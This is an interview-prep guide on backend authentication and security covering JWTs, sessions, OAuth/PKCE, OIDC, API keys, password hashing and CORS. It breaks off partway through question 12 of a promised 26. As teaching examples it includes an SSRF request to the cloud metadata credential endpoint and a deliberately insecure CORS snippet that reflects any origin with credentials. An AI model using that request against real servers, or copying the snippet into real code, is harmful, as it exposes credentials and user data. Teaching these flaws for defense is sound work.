# Authentication & Security

> **26 questions** — 14 theory, 9 practical, 3 experience

- Authentication vs authorization and why they must be separate concerns
- Hashing vs encryption, symmetric vs asymmetric cryptography, digital signatures
- JWT deep dive: structure, HS256 vs RS256, stateless tradeoffs, and when to avoid JWTs
- JWT vs session-based auth: scalability, revocation, and blocklisting
- Secure session management: HttpOnly, Secure, SameSite cookie flags, session fixation, session regeneration
- Token rotation, refresh token reuse detection, and token family tracking
- OAuth 2.0: Authorization Code flow, PKCE, and why Implicit was deprecated
- OpenID Connect (OIDC): ID tokens vs access tokens, when OIDC vs plain OAuth, and why OIDC replaced SAML for most use cases
- API key authentication: generation, hashed storage, rotation, and security risks
- Password hashing: bcrypt, scrypt, argon2 vs SHA-256, salt, pepper, and cost factors
- OWASP Top 10 for backend: SQL injection (parameterized queries), SSRF, broken access control, mass assignment, CSRF token mechanics
- Input validation and output encoding: schema validation at API boundaries (Zod/Joi), XSS prevention via output encoding, defense-in-depth layering, ReDoS risks in validation patterns
- CORS: origin model, preflight requests, Access-Control-Allow-Origin, credentialed requests, and common misconfigurations
- Access control models: RBAC middleware implementation, ABAC and policy engines (OPA), and when roles alone aren't enough
- Rate limiting and brute-force protection: account lockout policies, exponential backoff, CAPTCHA triggers, IP-based vs account-based throttling, request payload size limits as DoS prevention

---

## Foundational

<details>
<summary>1. Why must authentication and authorization be treated as separate concerns — what does each one do, what goes wrong when they're conflated in code (e.g., checking permissions inside the login flow), and how should a well-designed backend layer them so they can evolve independently?</summary>

**Authentication** answers "who are you?" — it verifies identity (via password, token, certificate). **Authorization** answers "what are you allowed to do?" — it checks permissions against a policy.

**What goes wrong when they're conflated:**

- **Tight coupling**: If your login handler also checks whether the user has admin access, you can't change your auth provider (e.g., switching from local passwords to SSO) without touching authorization logic. Similarly, adding a new permission model means editing authentication code.
- **Testing difficulty**: You can't unit test permission logic without simulating a full login flow.
- **Security gaps**: Mixing concerns leads to code paths where authorization checks get skipped — for example, an API key auth path that doesn't go through the same permission middleware as the session-based path.
- **Scattered logic**: Permission checks end up duplicated across login, middleware, and individual route handlers with no single source of truth.

**How to layer them properly:**

```
Request → Authentication Middleware → Authorization Middleware → Route Handler
```

1. **Authentication middleware** runs first on every request. It validates the credential (JWT, session cookie, API key) and attaches a user identity to the request context. It knows nothing about permissions — it only answers "is this a valid, identified user?"

2. **Authorization middleware** runs second. It takes the identity from step 1 and checks it against a permission policy (RBAC, ABAC, etc.). It knows nothing about how the user proved their identity.

3. **Route handler** trusts that both layers have run and focuses on business logic.

```typescript
// Authentication — identity only
const authenticate = (req: Request, res: Response, next: NextFunction) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const user = verifyToken(token); // throws if invalid
  req.user = user; // attach identity
  next();
};

// Authorization — permissions only
const authorize = (...requiredPermissions: string[]) => {
  return (req: Request, res: Response, next: NextFunction) => {
    const userPermissions = getPermissionsForUser(req.user);
    const hasAll = requiredPermissions.every(p => userPermissions.includes(p));
    if (!hasAll) return res.status(403).json({ error: 'Forbidden' });
    next();
  };
};

// Usage — each concern is independent
app.delete('/users/:id', authenticate, authorize('users:delete'), deleteUser);
```

This separation means you can swap JWT auth for session auth without touching any authorization code, or migrate from RBAC to ABAC without changing how users log in.

</details>

<details>
<summary>2. What is the difference between hashing and encryption, and between symmetric and asymmetric cryptography — why is hashing irreversible (and why that matters for passwords), when would you use symmetric vs asymmetric encryption, and how do digital signatures use asymmetric keys to prove authenticity and integrity?</summary>

**Hashing vs Encryption:**

| | Hashing | Encryption |
|---|---|---|
| **Direction** | One-way (irreversible) | Two-way (reversible with a key) |
| **Purpose** | Verify integrity / store secrets you never need to read back | Protect data you need to read back later |
| **Output** | Fixed-length digest | Ciphertext (same length as input, roughly) |
| **Key required?** | No key (the algorithm is deterministic) | Yes — decryption requires the correct key |

Hashing is irreversible because it's a lossy compression — infinite possible inputs map to a fixed-size output, so you can't reconstruct the original. For passwords, this is exactly what you want: you store the hash, and on login you hash the input and compare. Even if the database is stolen, attackers can't reverse the hashes back to passwords (they can only try to brute-force them, which is why you use slow hashes like bcrypt — covered in question 11).

**Symmetric vs Asymmetric Encryption:**

| | Symmetric | Asymmetric |
|---|---|---|
| **Keys** | One shared secret key | Key pair: public key + private key |
| **Speed** | Fast (AES: hardware-accelerated) | Slow (RSA: ~1000x slower than AES) |
| **Key distribution problem** | Both parties must securely share the key | Only the public key needs to be shared |
| **Use cases** | Encrypting data at rest, TLS bulk data | Key exchange, digital signatures, encrypting small payloads |

**When to use which:**
- **Symmetric (AES-256)**: Encrypting database fields, file encryption, TLS data transfer (after handshake). Fast, but you need a secure way to share the key.
- **Asymmetric (RSA, ECDSA)**: TLS handshake (to exchange the symmetric key), JWT signing (RS256), SSH authentication, code signing. Solves the key distribution problem but too slow for bulk data.

In practice, most systems use **hybrid encryption**: asymmetric crypto to exchange a symmetric key, then symmetric crypto for the actual data (this is exactly what TLS does).

**Digital Signatures:**

A digital signature proves two things: **authenticity** (it came from the claimed sender) and **integrity** (it wasn't modified in transit).

The flow:
1. The signer hashes the message, then encrypts the hash with their **private key** — this is the signature.
2. The verifier decrypts the signature with the signer's **public key** to get the original hash, then hashes the message themselves and compares. If they match, the message is authentic and unmodified.

This works because only the private key holder can produce a signature that the public key can verify. JWT RS256 signing is exactly this pattern — the auth server signs with its private key, and any service with the public key can verify without needing the secret.

</details>

<details>
<summary>3. What are the OWASP Top 10 vulnerabilities most relevant to backend engineers — why do categories like injection, broken access control, and SSRF keep appearing on this list year after year, what common development patterns cause them, and what is the overarching defense philosophy (input validation, least privilege, output encoding) that prevents entire classes of vulnerabilities rather than individual attacks?</summary>

**The most relevant OWASP Top 10 categories for backend engineers:**

1. **Broken Access Control (#1)** — Users can act outside their intended permissions. Missing authorization checks on API endpoints, IDOR (insecure direct object references) where `/api/orders/123` returns any user's order without ownership validation, privilege escalation by manipulating role fields in requests.

2. **Injection (#3)** — SQL injection, NoSQL injection, command injection. String concatenation with user input in queries. Still rampant because ORMs sometimes tempt developers into raw queries, and template strings make concatenation easy.

3. **SSRF (Server-Side Request Forgery, part of #10)** — The server makes HTTP requests to URLs controlled by the attacker (e.g., a webhook URL field that fetches `http://169.254.169.254/latest/meta-data/` to steal cloud credentials). Any feature that takes a URL as input and fetches it server-side is vulnerable.

4. **Security Misconfiguration (#5)** — Default credentials, verbose error messages exposing stack traces, unnecessary ports open, CORS wildcard with credentials, missing security headers.

5. **Cryptographic Failures (#2)** — Storing passwords with MD5/SHA-256 instead of bcrypt, transmitting sensitive data without TLS, using weak/deprecated algorithms.

**Why these keep appearing:**

- **Broken access control** persists because authorization is inherently application-specific — frameworks can't auto-generate it. Every new endpoint needs manual permission checks, and missing one creates a vulnerability.
- **Injection** persists because string interpolation is the natural way developers write code, and parameterized queries require deliberate effort.
- **SSRF** is increasing because microservices make more server-to-server HTTP calls, creating more attack surface.

**The overarching defense philosophy — prevent classes, not instances:**

Rather than patching individual vulnerabilities, senior engineers think in terms of **defense-in-depth layers** that eliminate entire categories:

- **Input validation at the boundary**: Validate shape, type, and range of all input using schema validators (Zod/Joi) before it reaches business logic. This blocks injection, mass assignment, and malformed data in one layer.
- **Parameterized queries everywhere**: Never concatenate user input into queries. Use ORMs or parameterized statements. This eliminates SQL injection as a class.
- **Output encoding**: Encode data when rendering it in a different context (HTML, URL, SQL). This eliminates XSS and second-order injection.
- **Least privilege**: Services run with minimum permissions. Database users have only the permissions they need. Network access is restricted. This limits blast radius when something is compromised.
- **Allowlisting over denylisting**: Validate that input matches an expected pattern rather than trying to block known-bad patterns. Denylists are always incomplete.

The mindset shift: don't ask "how do I prevent this specific attack?" — ask "what architectural pattern makes this entire class of attack impossible?"

</details>

## Conceptual Depth

<details>
<summary>4. Why do JWTs exist and when should you use them vs avoid them — what are the three parts (header, payload, signature), how does signing with HS256 (symmetric) differ from RS256 (asymmetric) in key distribution and verification, and what are the real tradeoffs of stateless tokens that make teams regret choosing JWTs for certain use cases?</summary>

**Why JWTs exist:** JWTs solve the problem of transmitting verifiable claims between parties without requiring the verifier to call back to the issuer. In a distributed system, service B can trust a token issued by service A without making a network call to service A — it just verifies the signature.

**The three parts** (separated by dots: `header.payload.signature`):

1. **Header**: Metadata — the signing algorithm and token type.
   ```json
   { "alg": "RS256", "typ": "JWT" }
   ```

2. **Payload**: Claims — the actual data. Standard claims include `sub` (subject/user ID), `iss` (issuer), `exp` (expiration), `iat` (issued at). You add custom claims like roles or tenant ID.
   ```json
   { "sub": "user-123", "role": "editor", "exp": 1700000000 }
   ```

3. **Signature**: Proof of integrity. Created by signing `base64(header).base64(payload)` with the algorithm specified in the header.

**HS256 vs RS256:**

| | HS256 (Symmetric) | RS256 (Asymmetric) |
|---|---|---|
| **Key** | Single shared secret | Private key (signs) + Public key (verifies) |
| **Who can sign** | Anyone with the secret | Only the holder of the private key |
| **Who can verify** | Anyone with the secret (same key) | Anyone with the public key |
| **Key distribution** | Every service needs the secret — risky | Only the auth server needs the private key; public key can be freely distributed |
| **Best for** | Single-service apps | Microservices, third-party verification |

RS256 is preferred in microservices because services only need the public key to verify tokens — they can't forge them. With HS256, any service holding the shared secret can also create tokens, which violates least privilege.

**When to use JWTs:**
- Stateless API authentication in distributed systems where you don't want a central session store
- Service-to-service authentication (one service trusts tokens issued by another)
- Short-lived authorization (e.g., a 15-minute access token)

**When to avoid JWTs — the real tradeoffs that cause regret:**

- **No instant revocation**: Once issued, a JWT is valid until it expires. You can't "log out" a user without adding a blocklist — which reintroduces server-side state, defeating the main benefit. Teams that need instant logout (admin banning a user, compromised account) often end up building a blocklist and wonder why they didn't just use sessions.
- **Token size**: JWTs with many claims can be 1-2KB, sent on every request. Session IDs are ~32 bytes.
- **Sensitive data in payload**: The payload is base64-encoded, not encrypted. Developers sometimes put sensitive data in JWTs assuming they're opaque. Anyone can decode them.
- **Complexity**: Key rotation, refresh token flows, and blocklisting add significant complexity. Sessions with a Redis store are simpler for many use cases.
- **Can't update claims mid-session**: If a user's role changes, the JWT still contains the old role until it expires.

**Rule of thumb**: If your system is a monolith or small service with a database, sessions are simpler. If you have multiple services that need to independently verify identity without shared state, JWTs make sense.

</details>

<details>
<summary>5. How do JWTs compare to session-based authentication — what are the tradeoffs in scalability (stateless vs server-side state), how does revocation work differently (token blocklisting vs session deletion), and why do some teams regret choosing JWTs for use cases where sessions would have been simpler?</summary>

Building on the JWT foundations from question 4, here's the direct comparison:

**Scalability:**

| | Session-based | JWT-based |
|---|---|---|
| **State** | Server-side (memory, Redis, or DB) | Client-side (token contains everything) |
| **Scaling horizontally** | Requires shared session store (Redis) or sticky sessions | Stateless — any server can verify the token |
| **Storage cost** | Session store grows with active users | No server storage (unless you add a blocklist) |
| **Request overhead** | Tiny session ID in cookie (~32 bytes) | Full JWT in header (500 bytes to 2KB) |

Sessions require a shared store for multi-server setups, but Redis handles this trivially at scale — it's a solved problem, not a real barrier. The "JWTs scale better" argument is often overstated.

**Revocation:**

This is where the architectures differ most:

- **Sessions**: Delete the session from the store. Immediate effect — the next request with that session ID fails. Simple, reliable.
- **JWTs**: The token is self-contained and valid until `exp`. To revoke, you must either:
  - **Blocklist the token**: Store revoked token IDs in Redis and check every request. This brings back server-side state.
  - **Short expiration + refresh tokens**: Use 5-15 minute access tokens and revoke at the refresh token level. This means a compromised token is valid for up to 15 minutes.

**Why teams regret choosing JWTs:**

1. **"We thought we didn't need revocation"** — then a user reports their account is compromised, and you realize you can't invalidate their token. You build a blocklist, and now you have server-side state anyway, but with more complexity than sessions.

2. **"We thought stateless would be simpler"** — then you need refresh token rotation, token family tracking, key rotation, and JWKS endpoints. The total system complexity exceeds what a Redis-backed session store would have been.

3. **"We're actually a monolith"** — a single Node.js service with a database doesn't benefit from stateless tokens. Sessions with `express-session` and a Redis store take 10 lines of code and handle revocation natively.

**When sessions are the better choice:**
- Monolithic applications or small service counts
- Applications requiring instant logout/revocation
- When you already have Redis infrastructure
- Server-rendered applications (cookies are the natural transport)

**When JWTs earn their complexity:**
- True microservices where multiple services need to verify identity independently
- Cross-domain authentication (tokens work across domains; cookies don't without workarounds)
- Third-party API consumers who can't use cookies
- Service-to-service auth where no user session exists

</details>

<details>
<summary>6. What makes session management secure — why are the HttpOnly, Secure, and SameSite cookie flags each necessary, what is session fixation and how does session regeneration after login prevent it, and what other session attacks exist (session hijacking, session replay)?</summary>

**Cookie security flags — each prevents a different attack:**

| Flag | What it does | What it prevents |
|---|---|---|
| **HttpOnly** | Cookie is inaccessible to JavaScript (`document.cookie`) | XSS-based session theft — even if an attacker injects script, they can't read the session cookie |
| **Secure** | Cookie is only sent over HTTPS connections | Session hijacking via network sniffing on HTTP (e.g., public WiFi) |
| **SameSite=Lax** or **Strict** | Cookie is not sent on cross-origin requests (Strict) or only on top-level navigations (Lax) | CSRF attacks — a malicious site can't trigger authenticated requests to your API |
| **Path** | Limits which URL paths receive the cookie | Reduces exposure to other applications on the same domain |
| **Max-Age / Expires** | Sets cookie lifetime | Limits the window of exposure for stolen cookies |

```typescript
// Secure cookie configuration
res.cookie('sessionId', sessionId, {
  httpOnly: true,       // no JavaScript access
  secure: true,         // HTTPS only
  sameSite: 'lax',      // CSRF protection (Strict blocks legitimate cross-site navigations)
  path: '/',
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
});
```

**Session Fixation:**

The attack: An attacker obtains a valid session ID (by creating a session on the target site), then tricks the victim into authenticating with that session ID (e.g., via a crafted URL with the session ID). After the victim logs in, the attacker's session ID is now associated with the victim's authenticated session — the attacker has access.

**Session regeneration** prevents this by creating a new session ID after successful authentication:

```typescript
// After successful login
req.session.regenerate((err) => {
  // Old session ID is invalidated, new one is issued
  req.session.userId = user.id;
  // The attacker's old session ID is now useless
});
```

**Other session attacks:**

- **Session hijacking**: Stealing the session cookie through XSS, network sniffing, or accessing the victim's browser. Prevented by HttpOnly + Secure flags, and binding sessions to additional context (IP, user agent) as a detection signal.

- **Session replay**: Intercepting and replaying a valid session cookie. Mitigated by short session lifetimes, HTTPS (prevents interception), and sliding expiration (extending the session on activity means idle sessions expire quickly).

- **Session brute-forcing**: Guessing session IDs. Prevented by using cryptographically random session IDs with sufficient entropy (128+ bits). Never use sequential or predictable IDs.

**Defense summary**: The combination of HttpOnly + Secure + SameSite + session regeneration + cryptographic randomness + HTTPS covers the major attack vectors. No single flag is sufficient alone — they're layered defenses that each address a different threat.

</details>

<details>
<summary>7. How does token rotation work with refresh tokens — why do access tokens need short lifetimes while refresh tokens are long-lived, what is refresh token reuse detection and how does token family tracking catch stolen refresh tokens, and what happens when a client legitimately retries a refresh request?</summary>

**Why the split lifetime:**

Access tokens are sent on every API request and travel over the network frequently — more exposure means higher theft risk. Short lifetimes (5-15 minutes) limit the damage window: a stolen access token is useless after it expires.

Refresh tokens are sent only to the token endpoint (not to API servers), stored more securely, and used infrequently. They can live longer (days to weeks) because they have lower exposure. Their job is to get new access tokens without forcing the user to re-authenticate.

**Token rotation flow:**

1. Client sends refresh token to `/token` endpoint
2. Server validates the refresh token, issues a **new** access token AND a **new** refresh token
3. The old refresh token is invalidated (single-use)
4. Client stores the new refresh token and uses the new access token

This means each refresh token can only be used once. If an attacker steals a refresh token and uses it, the legitimate client's next refresh attempt will fail (because their token was already consumed) — or vice versa.

**Reuse detection and token family tracking:**

Every refresh token belongs to a **token family** — a chain that traces back to the original login. The server stores:

```typescript
interface RefreshToken {
  tokenId: string;
  familyId: string;    // all tokens from the same login share this
  userId: string;
  used: boolean;        // marked true after rotation
  expiresAt: Date;
}
```

When a refresh token is submitted:
- If it's **valid and unused**: Normal rotation — issue new tokens, mark old one as used
- If it's **already used** (reuse detected): An attacker or the legitimate client has already consumed this token. **Invalidate the entire token family** — all refresh tokens in this chain are revoked. Both the attacker and the user are forced to re-authenticate.

This is aggressive but secure: if reuse is detected, you can't know who has the valid token and who has the stolen one, so you kill the whole family.

**Handling legitimate retries:**

Network failures create a real problem: the client sends a refresh request, the server rotates the token and responds, but the response is lost. The client retries with the same (now-used) token, triggering false-positive reuse detection.

Common solutions:

- **Grace period**: Allow the old refresh token to be reused for a short window (e.g., 30 seconds) after rotation. If the same token is resubmitted within the grace period from the same IP/device fingerprint, return the same new token pair instead of flagging reuse.
- **Idempotency key**: The client sends a unique request ID. If the server sees the same ID, it returns the previously issued tokens.
- **Accept the tradeoff**: Some systems simply force re-login on reuse, accepting occasional false positives as the safer default. This is simpler and avoids weakening the reuse detection.

The implementation details of token family tracking are covered in question 17.

</details>

<details>
<summary>8. How does OAuth 2.0 work — walk through the Authorization Code flow step by step (who talks to whom and why), what is PKCE and why is it required for public clients (SPAs, mobile), and why was the Implicit flow deprecated (what vulnerability did it create)?</summary>

**OAuth 2.0 Authorization Code flow — step by step:**

Actors: **User** (resource owner), **Client** (your app), **Authorization Server** (e.g., Google, Auth0), **Resource Server** (API with protected data).

**Why a two-step dance (code then token)?** The flow splits into a front channel (browser redirects — visible in URLs) and a back channel (server-to-server — never exposed to the browser). The authorization code travels through the front channel, but tokens are exchanged on the back channel. The `client_secret` in step 6 proves the client's identity, ensuring a stolen authorization code alone is useless. This separation is what makes the flow secure.

```
1. User clicks "Login with Google" in the Client

2. Client redirects user's browser to Authorization Server:
   GET https://auth.example.com/authorize?
     response_type=code
     &client_id=YOUR_CLIENT_ID
     &redirect_uri=https://yourapp.com/callback
     &scope=openid profile email
     &state=random_csrf_token

3. User authenticates with Authorization Server (enters credentials)

4. User consents to the requested scopes

5. Authorization Server redirects back to Client with an authorization CODE:
   GET https://yourapp.com/callback?code=AUTH_CODE&state=random_csrf_token

6. Client (backend) exchanges the code for tokens — server-to-server call:
   POST https://auth.example.com/token
     grant_type=authorization_code
     &code=AUTH_CODE
     &redirect_uri=https://yourapp.com/callback
     &client_id=YOUR_CLIENT_ID
     &client_secret=YOUR_CLIENT_SECRET

7. Authorization Server returns access token (and optionally refresh token)

8. Client uses access token to call Resource Server APIs
```

**PKCE (Proof Key for Code Exchange):**

Public clients (SPAs, mobile apps) can't store a `client_secret` — anyone can decompile the app and extract it. PKCE replaces the client secret with a cryptographic proof:

1. Client generates a random `code_verifier` (128-character random string)
2. Client computes `code_challenge = SHA256(code_verifier)` and sends it in the authorize request
3. When exchanging the code for tokens, client sends the original `code_verifier`
4. Auth server hashes the verifier and compares it to the stored challenge

An attacker who intercepts the authorization code can't use it because they don't have the `code_verifier` that matches the challenge. The verifier never travels through the browser — it stays in the client's memory.

```
// Step 2: Authorization request includes the challenge
GET /authorize?
  response_type=code
  &code_challenge=BASE64URL(SHA256(code_verifier))
  &code_challenge_method=S256
  ...

// Step 6: Token exchange includes the verifier
POST /token
  grant_type=authorization_code
  &code=AUTH_CODE
  &code_verifier=ORIGINAL_RANDOM_STRING
```

**Why Implicit flow was deprecated:**

The Implicit flow returned the access token directly in the URL fragment (`#access_token=...`) — skipping the code exchange entirely. This created critical vulnerabilities:

- **Token exposed in browser history and URLs**: The access token appeared in the redirect URL, potentially logged by proxies, browser extensions, and referrer headers.
- **No client authentication**: There was no way to verify that the token was being used by the intended client.
- **No refresh tokens**: Implicit flow didn't support refresh tokens, so apps had to do silent re-authorization — a poor UX and security tradeoff.
- **Token interception**: Attackers could intercept the redirect and steal the token before the client received it.

PKCE-enhanced Authorization Code flow provides the same browser-only capability as Implicit but with the security of the code exchange pattern. There is no remaining use case for Implicit flow.

</details>

<details>
<summary>9. What does OpenID Connect (OIDC) add on top of OAuth 2.0 — what is the difference between an ID token and an access token (who is each for), when should you use OIDC vs plain OAuth 2.0, and why has OIDC replaced SAML for most modern applications?</summary>

**What OIDC adds:**

OAuth 2.0 is an **authorization** framework — it lets apps access resources on behalf of a user. But it says nothing about **who the user is**. OAuth gives you a key to someone's house; it doesn't tell you whose house it is.

OIDC is a thin identity layer on top of OAuth 2.0 that standardizes:
- **ID tokens** (JWT containing user identity claims)
- **UserInfo endpoint** (API to fetch additional user profile data)
- **Standard scopes** (`openid`, `profile`, `email`)
- **Discovery** (`.well-known/openid-configuration` — auto-discoverable endpoints and keys)

**ID token vs Access token:**

| | ID Token | Access Token |
|---|---|---|
| **Format** | Always a JWT (standardized) | Can be JWT or opaque string (provider-specific) |
| **Audience** | The **client application** (your app) | The **resource server** (API) |
| **Purpose** | Tells your app who the user is | Grants access to API resources |
| **Contains** | User identity: `sub`, `email`, `name`, `iss`, `aud`, `exp` | Scopes/permissions (format varies) |
| **Should be sent to APIs?** | No — it's for the client only | Yes — this is what APIs validate |

A common mistake is sending the ID token to APIs as a bearer token. The ID token is meant to be consumed by your frontend/backend to establish the user's identity. The access token is what you send to APIs.

**When to use OIDC vs plain OAuth 2.0:**

- **OIDC**: When you need to know who the user is — login/signup flows, SSO, "Sign in with Google," displaying user profile info. This is the majority of cases.
- **Plain OAuth 2.0**: When you only need API access without user identity — e.g., a service accessing a third-party API on behalf of itself (client credentials grant), or when you already have identity from another source and just need authorization.

**Why OIDC replaced SAML:**

SAML (Security Assertion Markup Language) was the SSO standard before OIDC. It's XML-based and was designed for server-rendered web applications. OIDC won because:

- **JSON/REST vs XML/SOAP**: OIDC uses JSON and standard HTTP — trivial to implement in any language. SAML requires XML parsing, signature validation on XML documents, and complex libraries.
- **Mobile/SPA friendly**: SAML was designed for browser redirects between server-rendered pages. OIDC works natively with SPAs, mobile apps, and APIs through standard HTTP flows and JWTs.
- **Simpler integration**: Adding "Sign in with Google" via OIDC takes a few API calls. SAML integration typically requires configuring metadata XML documents, certificate exchange, and attribute mapping.
- **Built on OAuth 2.0**: If you already use OAuth for API authorization, adding OIDC for identity is minimal additional work — same flows, same token endpoint, plus an ID token.

SAML is still prevalent in enterprise environments (many corporate identity providers still support it), but new applications almost universally choose OIDC.

</details>

<details>
<summary>10. How should API key authentication be designed — how should you generate keys (randomness, entropy), why must keys be hashed in storage (not stored in plaintext), how do you handle rotation without breaking existing clients, and what are the security risks of API keys compared to OAuth tokens?</summary>

**Key generation:**

API keys must be cryptographically random with sufficient entropy to be unguessable:

```typescript
import { randomBytes } from 'node:crypto';

function generateApiKey(): string {
  const prefix = 'sk_live'; // human-readable prefix for identification
  const secret = randomBytes(32).toString('hex'); // 256 bits of entropy
  return `${prefix}_${secret}`;
  // Result: sk_live_a1b2c3d4e5f6...  (prefix + 64 hex chars)
}
```

The prefix serves two purposes: it helps developers identify which service and environment a key belongs to (like Stripe's `sk_live_` vs `sk_test_`), and it lets you quickly look up the key's metadata without hashing.

**Why hash in storage:**

API keys are equivalent to passwords — if your database is breached and keys are stored in plaintext, every client is immediately compromised. Hash them:

```typescript
import { createHash } from 'node:crypto';

function hashApiKey(key: string): string {
  // SHA-256 is fine for API keys (unlike passwords) because:
  // - Keys have high entropy (256 bits) — brute force is infeasible
  // - No need for slow hashing since keys aren't human-chosen
  return createHash('sha256').update(key).digest('hex');
}

// On creation: show key once, store only the hash
const key = generateApiKey();
const hash = hashApiKey(key);
await db.apiKeys.create({ prefix: 'sk_live', hash, userId, scopes });
// Return key to user — this is the only time they see it

// On verification: hash incoming key and look up
const incomingHash = hashApiKey(req.headers['x-api-key']);
const record = await db.apiKeys.findOne({ hash: incomingHash });
```

Note: SHA-256 (fast hash) is appropriate here because API keys have high entropy. For passwords (low entropy, human-chosen), you need bcrypt/argon2 (as covered in question 11).

**Rotation without breaking clients:**

The key principle: allow multiple active keys per client during a transition period.

1. Client requests a new key via the API
2. New key is generated and stored (both old and new are valid)
3. Client updates their integration to use the new key
4. Client explicitly revokes the old key (or it expires after a grace period)

```typescript
// Key record supports multiple active keys
interface ApiKeyRecord {
  id: string;
  hash: string;
  prefix: string;
  userId: string;
  scopes: string[];
  expiresAt: Date | null;  // null = no expiration
  createdAt: Date;
  revokedAt: Date | null;
}

// Verification checks all non-revoked, non-expired keys
async function verifyApiKey(key: string): Promise<ApiKeyRecord | null> {
  const hash = hashApiKey(key);
  return db.apiKeys.findOne({
    hash,
    revokedAt: null,
    $or: [{ expiresAt: null }, { expiresAt: { $gt: new Date() } }],
  });
}
```

**Security risks of API keys vs OAuth tokens:**

- **No expiration by default**: API keys are typically long-lived (months/years). OAuth access tokens expire in minutes. A leaked API key is useful until someone notices and revokes it.
- **No scope granularity** (often): Many API key implementations grant full access. OAuth tokens are scoped to specific permissions.
- **No user context**: API keys identify a client/service, not a user. They can't represent "user X authorized app Y to read their data."
- **Shared secret problem**: The key is sent on every request — more exposure. OAuth access tokens can be short-lived, and refresh tokens are only sent to the token endpoint.
- **No standard revocation protocol**: Each service implements its own key management UI/API. OAuth has token revocation standards (RFC 7009).

**When API keys are appropriate**: Server-to-server integrations, service accounts, public API access (like map tiles), internal tooling. They're simpler than OAuth for machine-to-machine auth where you don't need user delegation.

</details>

<details>
<summary>11. Why should you use bcrypt, scrypt, or argon2 for password hashing instead of SHA-256 — what makes these algorithms deliberately slow (cost factors, memory-hardness), what do salt and pepper each protect against, and how do you choose the right cost factor that balances security with login latency?</summary>

**The core problem with SHA-256 for passwords:**

SHA-256 is designed to be fast — a modern GPU can compute billions of SHA-256 hashes per second. That's great for file integrity checks, but catastrophic for passwords. An attacker with a stolen database can brute-force an 8-character password in hours.

Password hashing algorithms are deliberately designed to be **slow** and **resource-intensive**, making brute-force attacks economically infeasible.

**What makes bcrypt, scrypt, and argon2 different:**

| Algorithm | Slowness mechanism | Tunable parameters |
|---|---|---|
| **bcrypt** | CPU-intensive key derivation with configurable rounds | `cost` (rounds = 2^cost iterations) |
| **scrypt** | CPU + **memory-hard** (requires large RAM allocation) | `N` (CPU/memory cost), `r` (block size), `p` (parallelism) |
| **argon2** | CPU + memory-hard + **parallelism-resistant** | `time` (iterations), `memory` (KB), `parallelism` (threads) |

Memory-hardness is critical because GPUs have massive parallelism but limited memory per core. An algorithm that requires 64MB of RAM per hash means a GPU with 5,000 cores would need 320GB of RAM to attack in parallel — making hardware-accelerated attacks impractical.

**Argon2** (specifically Argon2id) is the current recommendation — it won the Password Hashing Competition and defends against both GPU and side-channel attacks.

**Salt and pepper:**

- **Salt**: A unique random value generated per password, stored alongside the hash. It prevents **rainbow table attacks** (precomputed hash lookups) and ensures two users with the same password produce different hashes. Without salt, an attacker who cracks one hash immediately knows all accounts with that password.

- **Pepper**: A secret value applied to all passwords, stored separately from the database (e.g., in environment variables or a secret manager). It prevents **offline attacks** — even if the database is fully compromised, the attacker can't compute hashes without the pepper. It's a defense-in-depth layer on top of salt.

```typescript
import { hash, verify } from 'argon2';

// Hashing — salt is automatically generated and embedded in the output
const hashedPassword = await hash(password + PEPPER, {
  type: 2,          // argon2id
  memoryCost: 65536, // 64 MB
  timeCost: 3,       // 3 iterations
  parallelism: 4,    // 4 threads
});
// Output: $argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>

// Verification
const isValid = await verify(hashedPassword, inputPassword + PEPPER);
```

**Choosing the right cost factor:**

The goal: make hashing slow enough to deter attackers but fast enough for a reasonable login experience.

- **Target**: 250ms-1s per hash on your production hardware. Users tolerate up to ~1s for login.
- **Method**: Benchmark on your actual server, not your laptop. Start with recommended defaults and increase until you hit your latency target.
- **Argon2id defaults**: `memoryCost: 65536` (64MB), `timeCost: 3`, `parallelism: 4` — adjust memory first (most impactful), then time.
- **bcrypt**: `cost: 12` is a common starting point (~250ms on modern hardware). Each increment doubles the time.

**Important**: Re-hash passwords on login when upgrading cost factors. Check if the stored hash uses the old cost, and if so, hash with the new cost and update the stored hash.

</details>

<details>
<summary>12. How does the browser's same-origin policy work and why does CORS exist to relax it — what triggers a preflight OPTIONS request vs a simple request, how does Access-Control-Allow-Origin interact with credentialed requests (why can't you use a wildcard with credentials), and what are the most common CORS misconfigurations that create security vulnerabilities?</summary>

**Same-origin policy:**

The browser restricts scripts on one origin from reading responses from a different origin. An origin is the combination of **scheme + host + port** — `https://app.example.com:443` is a different origin from `http://app.example.com:80` (different scheme) or `https://api.example.com:443` (different host).

Without this policy, a malicious page at `evil.com` could make fetch requests to `bank.com/api/account` using your cookies and read the response — stealing your banking data.

**CORS (Cross-Origin Resource Sharing)** is the mechanism that lets servers explicitly opt in to cross-origin requests by declaring which origins are allowed.

**Simple requests vs preflight:**

The browser sends a **preflight OPTIONS request** when the actual request uses "unsafe" features:

| Simple request (no preflight) | Preflight triggered |
|---|---|
| Methods: GET, HEAD, POST | Methods: PUT, DELETE, PATCH |
| Headers: only "simple" ones (Accept, Content-Type with form values, etc.) | Custom headers (Authorization, X-Request-ID) |
| Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` | Content-Type: `application/json` |

Most real API calls use `Authorization` headers and `application/json` — so preflights happen on nearly every cross-origin API request.

The preflight flow:
```
1. Browser sends OPTIONS /api/data with:
   Origin: https://app.example.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Authorization, Content-Type

2. Server responds with:
   Access-Control-Allow-Origin: https://app.example.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Authorization, Content-Type
   Access-Control-Max-Age: 86400  // cache preflight for 24h

3. If allowed, browser sends the actual request
```

**Credentialed requests and the wildcard restriction:**

When a request includes credentials (cookies, `Authorization` header), the server **cannot** respond with `Access-Control-Allow-Origin: *`. It must respond with the exact origin:

```
// This FAILS for credentialed requests:
Access-Control-Allow-Origin: *

// This works:
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

Why? If `*` worked with credentials, any site on the internet could make authenticated requests to your API and read the responses. The explicit origin requirement forces the server to consciously allow each origin.

**Common CORS misconfigurations that create vulnerabilities:**

1. **Reflecting the Origin header without validation:**
   ```typescript
   // DANGEROUS — accepts any origin
   res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
   res.setHeader('Access-Control-Allow-Credentials', 'true');
   ```
